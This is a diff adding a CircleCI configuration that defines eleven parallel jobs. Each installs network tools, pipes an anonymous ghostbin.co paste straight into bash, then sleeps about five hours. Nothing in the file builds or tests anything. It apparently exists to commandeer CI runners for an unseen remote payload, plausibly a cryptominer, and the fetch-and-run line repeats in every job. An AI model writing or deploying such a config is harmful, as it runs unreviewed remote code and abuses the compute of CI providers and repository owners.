@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  senyorsa:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  senyorsa10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/rh2j2/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - senyorsa
+      - senyorsa1
+      - senyorsa2
+      - senyorsa3
+      - senyorsa4
+      - senyorsa5
+      - senyorsa6
+      - senyorsa7
+      - senyorsa8
+      - senyorsa9
+      - senyorsa10
